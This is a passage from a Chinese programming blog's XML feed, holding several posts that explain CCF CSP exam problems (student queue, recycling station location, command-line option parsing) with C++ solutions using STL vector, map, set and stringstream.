operator">--</span><span class="token punctuation">)</span><span class="token punctuation">{</span>      string temp<span class="token punctuation">;</span>      cin<span class="token operator">>></span>temp<span class="token punctuation">;</span>      <span class="token keyword">if</span><span class="token punctuation">(</span>flag<span class="token operator">==</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">{</span>          <span class="token keyword">if</span><span class="token punctuation">(</span>temp<span class="token punctuation">.</span><span class="token function">find</span><span class="token punctuation">(</span>str<span class="token punctuation">)</span><span class="token operator">!=</span>str<span class="token punctuation">.</span>npos<span class="token punctuation">)</span><span class="token punctuation">{</span>           cout<span class="token operator">&lt;&lt;</span>temp<span class="token operator">&lt;&lt;</span>endl<span class="token punctuation">;</span>       <span class="token punctuation">}</span>      <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>          string s1<span class="token punctuation">,</span>s2<span class="token punctuation">;</span>          s1<span class="token operator">=</span><span class="token function">lower</span><span class="token punctuation">(</span>str<span class="token punctuation">)</span><span class="token punctuation">;</span>          s2<span class="token operator">=</span><span class="token function">lower</span><span class="token punctuation">(</span>temp<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token keyword">if</span><span class="token punctuation">(</span>s2<span class="token punctuation">.</span><span class="token function">find</span><span class="token punctuation">(</span>s1<span class="token punctuation">)</span><span class="token operator">!=</span>s1<span class="token punctuation">.</span>npos<span class="token punctuation">)</span><span class="token punctuation">{</span>            cout<span class="token operator">&lt;&lt;</span>temp<span class="token operator">&lt;&lt;</span>endl<span class="token punctuation">;</span>          <span class="token punctuation">}</span>      <span class="token punctuation">}</span>      <span class="token punctuation">}</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> CCF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> String </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CCF学生排队---复习STL-vector，vector增删真的方便</title>
      <link href="/2020/09/03/xueshengpaidui/"/>
      <url>/2020/09/03/xueshengpaidui/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1><span id="ccf-201703-2">CCF-201703-2</span></h1><h1><span id="tong-guo-zhe-ge-ti-mu-fu-xi-yi-xia-a-stl-vector">通过这个题目复习一下啊STL-vector</span></h1><p><img src="/images/loading.gif" data-original="https://img-blog.csdnimg.cn/20200903182145587.GIF#pic_center" alt="1"></p><h2><span id="ok-kan-kan-ti-mu-zen-me-shuo">OK!看看题目怎么说</span></h2><p><img src="/images/loading.gif" data-original="https://img-blog.csdnimg.cn/20200903182421721.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTM2ODMy,size_16,color_FFFFFF,t_70#pic_center" alt="2"></p><h3><span id="jie-ti-si-lu">解题思路</span></h3><p>思路很简单，就是先找到对应值的位置，然后把位置移动<br>那么会出现除掉一个之后，后面的值全部向前移动一个，就要用一个for循环来做<br><strong>vector帮我们完成了这个过程</strong><br>因为vector的长度是动态的，对于一些数特别多的题，用vector在数小的时候可以节约不少内存，而且方便骗分呢！</p><h3><span id="zhi-jie-shang-dai-ma-chong-a">直接上代码，冲啊！</span></h3><pre class=" language-cpp"><code class="language-cpp"><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;iostream></span></span><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;vector></span></span><span class="token keyword">using</span> <span class="token keyword">namespace</span> std<span class="token punctuation">;</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> v<span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">int</span> n<span class="token punctuation">,</span>m<span class="token punctuation">;</span>    cin<span class="token operator">>></span>n<span class="token operator">>></span>m<span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>n<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>      v<span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">while</span><span class="token punctuation">(</span>m<span class="token operator">--</span><span class="token punctuation">)</span><span class="token punctuation">{</span>      <span class="token keyword">int</span> a<span class="token punctuation">,</span>b<span class="token punctuation">;</span>      cin<span class="token operator">>></span>a<span class="token operator">>></span>b<span class="token punctuation">;</span>      <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>v<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>           <span class="token keyword">if</span><span class="token punctuation">(</span>v<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">==</span>a<span class="token punctuation">)</span><span class="token punctuation">{</span>            v<span class="token punctuation">.</span><span class="token function">erase</span><span class="token punctuation">(</span>v<span class="token punctuation">.</span><span class="token function">begin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">+</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>            v<span class="token punctuation">.</span><span class="token function">insert</span><span class="token punctuation">(</span>v<span class="token punctuation">.</span><span class="token function">begin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">+</span>i<span class="token operator">+</span>b<span class="token punctuation">,</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>           <span class="token punctuation">}</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>v<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>      cout<span class="token operator">&lt;&lt;</span>v<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">&lt;&lt;</span><span class="token string">" "</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p><img src="/images/loading.gif" data-original="https://img-blog.csdnimg.cn/20200903182925225.png#pic_center" alt="秒杀"></p><h3><span id="zong-jie">总结</span></h3><p>凡是遇到数组需要增删的用vector就很方便，很舒服！</p><h3><span id="zui-hou-fang-yi-xia-vector-de-api">最后放一下vector的API</span></h3><p><img src="/images/loading.gif" data-original="https://img-blog.csdnimg.cn/20200903183127845.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTM2ODMy,size_16,color_FFFFFF,t_70#pic_center" alt="vector-API"></p>]]></content>
      
      
      <categories>
          
          <category> CCF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> STL-vector </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CCF回收站选址---map与结构体的结合使用+复习STL-map</title>
      <link href="/2020/09/03/huishouzhanxuanzhi/"/>
      <url>/2020/09/03/huishouzhanxuanzhi/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1><span id="ccf-201912-2">CCF-201912-2</span></h1><h1><span id="jin-tian-jiu-zhe-ge-ti-mu-lai-fu-xi-yi-xia-stl-map">今天就这个题目来复习一下STL-map</span></h1><p><img src="/images/loading.gif" data-original="https://img-blog.csdnimg.cn/20200903110020412.GIF#pic_center" alt="下面都不会了"></p><h2><span id="bie-kan-tu-liao-kan-kan-ti-mu-zen-me-shuo-ba">别看图了，看看题目怎么说吧！</span></h2><p><img src="/images/loading.gif" data-original="https://img-blog.csdnimg.cn/20200903110607739.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTM2ODMy,size_16,color_FFFFFF,t_70#pic_center" alt="1"><br><img src="/images/loading.gif" data-original="https://img-blog.csdnimg.cn/20200903110620230.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTM2ODMy,size_16,color_FFFFFF,t_70#pic_center" alt="2"><br><img src="/images/loading.gif" data-original="https://img-blog.csdnimg.cn/20200903110629701.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTM2ODMy,size_16,color_FFFFFF,t_70#pic_center" alt="3"><br><img src="/images/loading.gif" data-original="https://img-blog.csdnimg.cn/20200903110647891.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTM2ODMy,size_16,color_FFFFFF,t_70#pic_center" alt="4"></p><h3><span id="jie-ti-si-lu">解题思路</span></h3><p>看到题目，最先想到的就是简单的bfs，其实我挺喜欢这种搜索的题，仔细点就能做出来，我们可以开一个大大的满足数据范围的二维数组，全部置零，然后输入的点对应的位置置1，表示这个点有人居住并把点记住。<br>输入完毕后，把记住的点全部拿出来。进行判断<br>1.上下左右的点都是1，那么这是个合格的垃圾站。<br>2.如果合格，我们要找到垃圾站的级别，这个时候，左上，右上，左下，右下每一个1，级别就+1，那么级别最低是0，最高是4。<br>3.我们假设这个级别是i，那么结果ans[i]++;<br>最后，用for循环打出ans的值就可以了<br>其实你可以发现，有几个不好的地方：<br>1.开数组，有很多地方没用上，消耗了内存<br>2.还要用结构体存点，其实和前面置1有点重复的感觉</p><h3><span id="shi-yong-stl-map-de-hao-chu">使用STL-map的好处</span></h3><p>map的查询可以用count()和find()，所以用来查询是很方便的。<br>本题由于不需要使用到二维数组的全部点，和复杂的图bfs有区别，那么，我们使用map来存点，就节约了很多内存了。</p><h3><span id="shi-yong-stl-map-de-zhu-yi-dian">使用STL-map的注意点</span></h3><p>1.map中如果使用到了结构体，结构体中需要写一个排序规则<br>2.find()如果没找到就会返回end()<br>3.map的参数调用为first，second，然后iterator是循环调用的关键字</p><h3><span id="xia-mian-shi-jie-ti-dai-ma">下面是解题代码</span></h3><pre class=" language-cpp"><code class="language-cpp"><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;iostream></span></span><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;cstring></span></span><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;map></span></span><span class="token macro property">#<span class="token directive keyword">define</span> mm(a,b) memset(a,b,sizeof(a))</span><span class="token keyword">using</span> <span class="token keyword">namespace</span> std<span class="token punctuation">;</span><span class="token keyword">struct</span> node<span class="token punctuation">{</span>    <span class="token keyword">int</span> x<span class="token punctuation">;</span>    <span class="token keyword">int</span> y<span class="token punctuation">;</span>    <span class="token function">node</span><span class="token punctuation">(</span><span class="token keyword">int</span> a<span class="token punctuation">,</span><span class="token keyword">int</span> b<span class="token punctuation">)</span><span class="token punctuation">{</span>      x<span class="token operator">=</span>a<span class="token punctuation">;</span>      y<span class="token operator">=</span>b<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">bool</span> <span class="token keyword">operator</span> <span class="token operator">&lt;</span> <span class="token punctuation">(</span><span class="token keyword">const</span> node a<span class="token punctuation">)</span><span class="token keyword">const</span><span class="token punctuation">{</span>      <span class="token keyword">if</span><span class="token punctuation">(</span>a<span class="token punctuation">.</span>x<span class="token operator">!=</span>x<span class="token punctuation">)</span> <span class="token keyword">return</span> a<span class="token punctuation">.</span>x<span class="token operator">&lt;</span>x<span class="token punctuation">;</span>      <span class="token keyword">else</span> <span class="token keyword">return</span> a<span class="token punctuation">.</span>y<span class="token operator">&lt;</span>y<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">;</span>map<span class="token operator">&lt;</span>node<span class="token punctuation">,</span><span class="token keyword">int</span><span class="token operator">></span> m<span class="token punctuation">;</span><span class="token keyword">int</span> xway<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token punctuation">{</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token keyword">int</span> yway<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token punctuation">{</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token keyword">int</span> xx<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token punctuation">{</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token keyword">int</span> yy<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token punctuation">{</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">check</span><span class="token punctuation">(</span>node a<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span><span class="token number">4</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>      <span class="token keyword">int</span> nx<span class="token operator">=</span>a<span class="token punctuation">.</span>x<span class="token operator">+</span>xway<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>      <span class="token keyword">int</span> ny<span class="token operator">=</span>a<span class="token punctuation">.</span>y<span class="token operator">+</span>yway<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>      <span class="token keyword">if</span><span class="token punctuation">(</span>m<span class="token punctuation">.</span><span class="token function">find</span><span class="token punctuation">(</span><span class="token function">node</span><span class="token punctuation">(</span>nx<span class="token punctuation">,</span>ny<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">==</span>m<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>             <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span><span class="token number">4</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>      <span class="token keyword">int</span> nx<span class="token operator">=</span>a<span class="token punctuation">.</span>x<span class="token operator">+</span>xx<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>      <span class="token keyword">int</span> ny<span class="token operator">=</span>a<span class="token punctuation">.</span>y<span class="token operator">+</span>yy<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>      <span class="token keyword">if</span><span class="token punctuation">(</span>m<span class="token punctuation">.</span><span class="token function">find</span><span class="token punctuation">(</span><span class="token function">node</span><span class="token punctuation">(</span>nx<span class="token punctuation">,</span>ny<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">!=</span>m<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> m<span class="token punctuation">[</span>a<span class="token punctuation">]</span><span class="token operator">++</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">int</span> n<span class="token punctuation">;</span>    cin<span class="token operator">>></span>n<span class="token punctuation">;</span>    <span class="token keyword">int</span> ans<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token function">mm</span><span class="token punctuation">(</span>ans<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span>n<span class="token operator">--</span><span class="token punctuation">)</span><span class="token punctuation">{</span>      <span class="token keyword">int</span> x<span class="token punctuation">,</span>y<span class="token punctuation">;</span>      cin<span class="token operator">>></span>x<span class="token operator">>></span>y<span class="token punctuation">;</span>      m<span class="token punctuation">[</span><span class="token function">node</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span>y<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">for</span><span class="token punctuation">(</span>map<span class="token operator">&lt;</span>node<span class="token punctuation">,</span><span class="token keyword">int</span><span class="token operator">></span><span class="token operator">::</span>iterator it<span class="token operator">=</span>m<span class="token punctuation">.</span><span class="token function">begin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>it<span class="token operator">!=</span>m<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>it<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>      <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">check</span><span class="token punctuation">(</span>it<span class="token operator">-</span><span class="token operator">></span>first<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            ans<span class="token punctuation">[</span>it<span class="token operator">-</span><span class="token operator">></span>second<span class="token punctuation">]</span><span class="token operator">++</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span><span class="token number">5</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>      cout<span class="token operator">&lt;&lt;</span>ans<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">&lt;&lt;</span>endl<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p><img src="/images/loading.gif" data-original="https://img-blog.csdnimg.cn/2020090311463399.png#pic_center" alt="过了哟"><strong>嘻嘻！</strong></p><h3><span id="zui-hou-shi-stl-map-de-api-liao">最后是STL-map的API了</span></h3><p><img src="/images/loading.gif" data-original="https://img-blog.csdnimg.cn/20200903113124421.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTM2ODMy,size_16,color_FFFFFF,t_70#pic_center" alt="Map-API"></p>]]></content>
      
      
      <categories>
          
          <category> CCF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> STL-map </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CCF命令行选项---初识sstream和getline()</title>
      <link href="/2020/09/03/minglinghangxuanxiang/"/>
      <url>/2020/09/03/minglinghangxuanxiang/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1><span id="ccf-201403-3">CCF-201403-3</span></h1><h1><span id="tong-guo-zhe-ge-ti-mu-wo-ren-shi-yi-xia-sstream-he-getline">通过这个题目我认识一下sstream和getline()</span></h1><p><img src="/images/loading.gif" data-original="https://img-blog.csdnimg.cn/20200903141557170.GIF#pic_center" alt="下面都不会了"></p><h2><span id="rang-wo-men-kan-kan-ti-mu-zen-me-shuo">让我们看看题目怎么说</span></h2><p><img src="/images/loading.gif" data-original="https://img-blog.csdnimg.cn/20200903141857958.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTM2ODMy,size_16,color_FFFFFF,t_70#pic_center" alt="1"></p><h3><span id="jie-ti-si-lu">解题思路</span></h3><p>1.首先我们要把第一行的字母提取出来，分辨出每个字母是带参的还是不带参的，可以使用两个vector，两个set，我们这里使用的是一个map，set在这里原则上会好于vector，因为set有find函数，这样查找的时候会方便，不多说，此题我们使用了map来存贮字母，1表示带参，0表示不带参<br>2.每一行的输入要使用到getline，然后把getline里面的string提取出来，我们使用到了sstream中的stringstream。<br><strong>需要注意的是：在getline()前要先读入一个空格，我们使用getchar()或者cin.ignore()都可以，这里我们使用了后者</strong><br>3.由于输入的字母需要排序，所以我们用set来存贮输出的结果<br><strong>在每次输入前，查询的map-m，和存储的set-ans和输入输出流ss都需要clear()</strong><br>4.失分点：如果带参的字母后面参数为空，那么这个参数报错，需要break；<br>5.失分点：ss.str(str) 不能用ss&lt;&lt;str代替，不然只能拿10分。</p><h3><span id="dai-ma-shi-zhe-yang-de">代码是这样的</span></h3><pre class=" language-cpp"><code class="language-cpp"><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;iostream></span></span><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;cstring></span></span><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;sstream></span></span><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;map></span></span><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;set></span></span><span class="token keyword">using</span> <span class="token keyword">namespace</span> std<span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    stringstream ss<span class="token punctuation">;</span>    map<span class="token operator">&lt;</span><span class="token keyword">char</span><span class="token punctuation">,</span><span class="token keyword">int</span><span class="token operator">></span> symbol<span class="token punctuation">;</span>    map<span class="token operator">&lt;</span>string<span class="token punctuation">,</span>string<span class="token operator">></span> m<span class="token punctuation">;</span>    set<span class="token operator">&lt;</span>string<span class="token operator">></span> ans<span class="token punctuation">;</span>    string str<span class="token punctuation">;</span>    cin<span class="token operator">>></span>str<span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>str<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>      <span class="token keyword">if</span><span class="token punctuation">(</span>str<span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token string">':'</span><span class="token punctuation">)</span><span class="token punctuation">{</span>          symbol<span class="token punctuation">[</span>str<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>          i<span class="token operator">++</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>          symbol<span class="token punctuation">[</span>str<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">int</span> n<span class="token punctuation">;</span>    cin<span class="token operator">>></span>n<span class="token punctuation">;</span>    cin<span class="token punctuation">.</span><span class="token function">ignore</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>i<span class="token operator">&lt;=</span>n<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>      string temp<span class="token punctuation">;</span>      <span class="token function">getline</span><span class="token punctuation">(</span>cin<span class="token punctuation">,</span>str<span class="token punctuation">)</span><span class="token punctuation">;</span>      m<span class="token punctuation">.</span><span class="token function">clear</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      ans<span class="token punctuation">.</span><span class="token function">clear</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      ss<span class="token punctuation">.</span><span class="token function">clear</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      ss<span class="token punctuation">.</span><span class="token function">str</span><span class="token punctuation">(</span>str<span class="token punctuation">)</span><span class="token punctuation">;</span>      ss<span class="token operator">>></span>temp<span class="token punctuation">;</span>      <span class="token keyword">while</span><span class="token punctuation">(</span>ss<span class="token operator">>></span>temp<span class="token punctuation">)</span><span class="token punctuation">{</span>          <span class="token keyword">if</span><span class="token punctuation">(</span>temp<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token string">'-'</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>symbol<span class="token punctuation">.</span><span class="token function">find</span><span class="token punctuation">(</span>temp<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">!=</span>symbol<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                    <span class="token keyword">if</span><span class="token punctuation">(</span>symbol<span class="token punctuation">[</span>temp<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                  string temp2<span class="token punctuation">;</span>                  ss<span class="token operator">>></span>temp2<span class="token punctuation">;</span>                  <span class="token keyword">if</span><span class="token punctuation">(</span>temp2<span class="token punctuation">.</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">break</span><span class="token punctuation">;</span>                  m<span class="token punctuation">[</span>temp<span class="token punctuation">]</span><span class="token operator">=</span>temp2<span class="token punctuation">;</span>                 <span class="token punctuation">}</span>                ans<span class="token punctuation">.</span><span class="token function">insert</span><span class="token punctuation">(</span>temp<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token keyword">else</span> <span class="token keyword">break</span><span class="token punctuation">;</span>          <span class="token punctuation">}</span>          <span class="token keyword">else</span> <span class="token keyword">break</span><span class="token punctuation">;</span>         <span class="token punctuation">}</span>      cout<span class="token operator">&lt;&lt;</span><span class="token string">"Case "</span><span class="token operator">&lt;&lt;</span>i<span class="token operator">&lt;&lt;</span><span class="token string">": "</span><span class="token punctuation">;</span>      <span class="token keyword">for</span><span class="token punctuation">(</span>set<span class="token operator">&lt;</span>string<span class="token operator">></span><span class="token operator">::</span>iterator it<span class="token operator">=</span>ans<span class="token punctuation">.</span><span class="token function">begin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>it<span class="token operator">!=</span>ans<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>it<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>           cout<span class="token operator">&lt;&lt;</span><span class="token operator">*</span>it<span class="token operator">&lt;&lt;</span><span class="token string">" "</span><span class="token punctuation">;</span>           <span class="token keyword">if</span><span class="token punctuation">(</span>m<span class="token punctuation">.</span><span class="token function">find</span><span class="token punctuation">(</span><span class="token operator">*</span>it<span class="token punctuation">)</span><span class="token operator">!=</span>m<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            cout<span class="token operator">&lt;&lt;</span>m<span class="token punctuation">[</span><span class="token operator">*</span>it<span class="token punctuation">]</span><span class="token 